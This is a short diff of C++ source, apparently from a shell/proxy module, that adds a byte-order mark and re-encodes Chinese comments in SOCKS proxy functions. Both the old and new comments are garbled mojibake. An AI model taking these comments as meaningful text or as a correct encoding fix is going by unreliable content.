@@ -1,4 +1,4 @@
-// ShellManager.cpp: implementation of the CShellManager class.
+ï»¿// ShellManager.cpp: implementation of the CShellManager class.
 //
 //////////////////////////////////////////////////////////////////////
 #include "stdafx.h"
@@ -134,7 +134,7 @@ DWORD CProxyManager::SocksThread(LPVOID lparam)
         return 0;
     }
     ip = *(DWORD*)&lpBuffer[5];
-    // ¹¹Ôìsockaddr_in½á¹¹
+    // æž„é€ sockaddr_inç»“æž„
     sockaddr_in	ClientAddr;
     ClientAddr.sin_family = AF_INET;
     ClientAddr.sin_port = *(u_short*)&lpBuffer[9];
@@ -220,7 +220,7 @@ DWORD CProxyManager::SocksThreadhostname(LPVOID lparam)
         return 0;
     }
 
-    // ¹¹Ôìsockaddr_in½á¹¹
+    // æž„é€ sockaddr_inç»“æž„
     sockaddr_in	ClientAddr;
     ClientAddr.sin_family = AF_INET;
     ClientAddr.sin_port = *(u_short*)&lpBuffer[5];
